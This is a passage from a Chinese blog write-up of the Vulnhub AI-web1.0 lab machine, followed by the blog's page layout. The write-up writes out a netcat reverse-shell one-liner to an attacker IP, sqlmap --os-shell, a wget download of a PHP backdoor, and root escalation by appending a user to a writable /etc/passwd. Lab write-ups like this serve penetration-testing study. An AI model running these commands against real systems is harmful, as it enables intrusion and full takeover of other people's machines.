+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解释一下上面语言的含义：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.19.132 6666 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>为了方便，使用命令<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>进入交互式shell</p>
+<h4 id="采用sqlmap反弹shell"><a href="#采用sqlmap反弹shell" class="headerlink" title="采用sqlmap反弹shell"></a>采用sqlmap反弹shell</h4><h5 id="尝试–os-shell拿shell"><a href="#尝试–os-shell拿shell" class="headerlink" title="尝试–os-shell拿shell"></a>尝试–os-shell拿shell</h5><p>–os-shell使用条件：</p>
+<p>1、需要知道网站的路径</p>
+<p>2、路径要求可写权限</p>
+<p>3、要有注入点</p>
+<p>使用–os-shell拿shell，需要知道网站的绝对路径，上面在<code>/m3diNf0/</code>目录下发现了网站的绝对路径<code>/home/www/html/web1x443290o2sdf92213</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;192.168.19.133/se3reTdir777/&quot;</span> --data <span class="string">&quot;uid=1&amp;Operation=Submit&quot;</span> --os-shell</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/21.png" alt="image-20220728100506513" style="zoom:67%;">
+
+<h5 id="反弹shell-2"><a href="#反弹shell-2" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>进入&#x2F;uploads目录下查看，写入shell成功</p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/22.png" alt="image-20220728105243924" style="zoom:67%;">
+
+<p>方法①：通过靶机wget一个php后门来反弹shell</p>
+<p>（1）自己写一个php后门文件</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/23.png" alt="image-20220728213915642"></p>
+<p>（2）在攻击机（kali）上运行临时服务器服务，命令：<code>python -m SimpleHTTPServer 8000</code>，在靶机AI-web上下载php后门文件shell.php，命令：<code> wget http://192.168.19.132:8000/shell.php</code></p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/24.png" alt="image-20220728232812965" style="zoom:67%;">
+
+<p>（3）攻击机kali监听4444端口来获取靶机的回显内容，靶机运行shell.php实现反弹</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/25.png" alt="image-20220728233454592"></p>
+<img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/26.png" alt="image-20220728233516034" style="zoom: 80%;">
+
+<p>方法②：使用msf生成一个python脚本，端口号7777</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/27.png" alt="image-20220730170636543"></p>
+<p>复制到os-shell中运行，攻击机kali开启监听</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/28.png" alt="image-20220730171531243"></p>
+<p>从上图可以看出，攻击机kali控制了客户机的查询和显示</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>反弹shell后，whoami查询客户机的身份是www-data，查看&#x2F;etc&#x2F;passwd文件属性</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/29.png" alt="image-20220730175732847"></p>
+<p>从图中可知，www-data对&#x2F;etc&#x2F;passwd有读写权限，那么可以在&#x2F;etc&#x2F;passwd文件中添加一个root权限的用户进行提权</p>
+<p>（1）上面sql注入发现用户密码是以密文形式存在，需要使用openssl工具加密密码，例如创建一个用户：用户名：smile，密码：root。命令：<code>openssl passwd -1 -salt smile root</code></p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/30.png" alt="image-20220730193550926"></p>
+<p>（2）将刚才生成的密码进行整理，生成&#x2F;etc&#x2F;passwd文件格式的字符串：<code>smile:$1$smile$ke8VJgTwlvwgYylHGBuVK1.:0:0::/root:/bin/bash</code></p>
+<p>（3）将字符串添加至&#x2F;etc&#x2F;passwd文件中，命令：<code>echo &#39;smile:$1$smile$ke8VJgTwlvwgYylHGBuVK1.:0:0::/root:/bin/bash&#39; &gt;&gt; /etc/passwd</code>，在os-shell反弹shell下，在靶机上使用python弹一个交互式shell，命令：<code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/31.png" alt="image-20220730210519807"></p>
+<p>成功写入&#x2F;etc&#x2F;passwd文件中，登录root权限用户</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/32.png" alt="image-20220730235736683"></p>
+<p>flag在&#x2F;root目录下，切换至&#x2F;root目录拿到flag</p>
+<p><img src="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/33.png" alt="image-20220730235924125"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/">Vulnhub渗透测试--AI-web1.0</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页"></a></p>
+        <p><span>发布时间:</span>2022-07-17, 16:08:08</p>
+        <p><span>最后更新:</span>2022-08-12, 17:08:51</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/" title="Vulnhub渗透测试--AI-web1.0">https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/　　作者: " title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                    Phar反序列化
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1-0"><span class="toc-number">1.</span> <span class="toc-text">Vulnhub渗透测试-AI-web1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.2.</span> <span class="toc-text">sqlmap注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BC%B9"><span class="toc-number">1.3.1.</span> <span class="toc-text">采用手工注入下的反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95into-outfile%E6%9D%A5%E8%8E%B7%E5%8F%96shell"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">尝试into outfile来获取shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-1"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">反弹shell:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%87%E7%94%A8sqlmap%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.2.</span> <span class="toc-text">采用sqlmap反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E2%80%93os-shell%E6%8B%BFshell"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">尝试–os-shell拿shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-2"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">反弹shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"Vulnhub渗透测试--AI-web1.0　| KrismileBlog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://krismile-ni.github.com/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/';
+            this.page.identifier = '2022/07/17/Vulnhub渗透测试-AI-web1.0/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="下一篇: Phar反序列化">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2022/07/17/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-AI-web1.0/">Vulnhub渗透测试--AI-web1.0</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/02/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/28/2022%E5%B9%B4%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF/">2022网刃杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/17/RCE/">RCE</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/natas/">Natas</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/09/XSS%E6%94%BB%E5%87%BB/">web基础---XSS攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/08/JWT%E5%9F%BA%E7%A1%80/">JWT基础知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/12/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/">PHP反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/MD5%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">web基础---MD5（）函数的漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/18/Web%E6%B8%97%E9%80%8F/">web渗透---信息收集方式</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/08/14/SQL%E6%B3%A8%E5%85%A5/">web基础---SQL注入</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2021-2022 krismile
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', '[object Object]', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
